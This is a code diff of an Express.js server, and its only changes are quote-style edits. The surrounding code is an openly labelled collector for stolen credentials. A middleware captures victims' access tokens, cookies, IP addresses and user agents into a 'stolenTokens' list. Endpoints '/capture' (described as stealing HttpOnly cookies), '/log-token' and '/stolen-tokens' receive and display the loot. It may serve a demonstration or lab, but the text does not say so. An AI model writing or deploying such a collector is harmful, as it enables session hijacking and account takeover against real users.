@@ -1,6 +1,6 @@
-import express from "express";
-import path from "path";
-import { fileURLToPath } from "url";
+import express from 'express';
+import path from 'path';
+import { fileURLToPath } from 'url';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -28,7 +28,7 @@ app.use((req, res, next) => {
         timestamp: new Date().toISOString(),
         token: accessToken,
         cookies: cookies,
-        userAgent: req.headers["user-agent"],
+        userAgent: req.headers['user-agent'],
         ip: req.ip,
         referer: req.headers.referer,
         url: req.url,
@@ -40,15 +40,15 @@ app.use((req, res, next) => {
       if (!exists) {
         stolenTokens.push(stolenData);
 
-        console.log("STOLEN TOKEN CAPTURED:");
-        console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
-        console.log("Timestamp:", stolenData.timestamp);
-        console.log("All Cookies:", stolenData.cookies);
-        console.log("Access Token:", stolenData.token.substring(0, 50) + "...");
-        console.log("User Agent:", stolenData.userAgent);
-        console.log("Referer:", stolenData.referer || "None");
-        console.log("IP Address:", stolenData.ip);
-        console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
+        console.log('STOLEN TOKEN CAPTURED:');
+        console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
+        console.log('Timestamp:', stolenData.timestamp);
+        console.log('All Cookies:', stolenData.cookies);
+        console.log('Access Token:', stolenData.token.substring(0, 50) + '...');
+        console.log('User Agent:', stolenData.userAgent);
+        console.log('Referer:', stolenData.referer || 'None');
+        console.log('IP Address:', stolenData.ip);
+        console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
       }
     }
   }
@@ -60,24 +60,24 @@ app.use((req, res, next) => {
 app.use(express.static(__dirname));
 
 // Endpoint specifically for capturing cookies (the main request that steals HttpOnly cookies)
-app.get("/capture", (req, res) => {
-  res.json({ success: true, message: "Cookies captured" });
+app.get('/capture', (req, res) => {
+  res.json({ success: true, message: 'Cookies captured' });
 });
 
 // Endpoint to log stolen cookies/tokens from JavaScript-accessible cookies
-app.post("/log-token", (req, res) => {
+app.post('/log-token', (req, res) => {
   const { jsAccessibleCookies, timestamp } = req.body;
 
   console.log(
-    "JavaScript-accessible cookies:",
-    jsAccessibleCookies || "None (all are HttpOnly)"
+    'JavaScript-accessible cookies:',
+    jsAccessibleCookies || 'None (all are HttpOnly)'
   );
 
-  res.json({ success: true, message: "Token logged" });
+  res.json({ success: true, message: 'Token logged' });
 });
 
 // Endpoint to view all stolen tokens
-app.get("/stolen-tokens", (req, res) => {
+app.get('/stolen-tokens', (req, res) => {
   res.json({
     total: stolenTokens.length,
     tokens: stolenTokens,
@@ -85,8 +85,8 @@ app.get("/stolen-tokens", (req, res) => {
 });
 
 // Serve the main page
-app.get("/", (req, res) => {
-  res.sendFile(path.join(__dirname, "index.html"));
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 app.listen(PORT, () => {
